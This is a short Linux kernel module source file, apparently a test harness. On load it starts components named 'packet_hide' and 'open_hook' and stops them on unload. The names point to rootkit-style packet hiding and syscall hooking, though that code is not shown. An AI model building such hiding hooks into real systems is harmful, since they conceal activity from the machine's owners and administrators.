#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "packet_hide.h"
#include "open_hook.h"

MODULE_LICENSE("GPL"); //for exporting kprobes

static int __init hooking_test_init(void) {
	printk(KERN_INFO "------------------Hello, World!-----------------");
	init_packet_hide();
	init_open_hook();
	return 0;
}

static void __exit hooking_test_exit(void) {
	exit_packet_hide();
	exit_open_hook();
	printk(KERN_INFO "-----------------Goodbye, World!----------------");
}

module_init(hooking_test_init);
module_exit(hooking_test_exit);
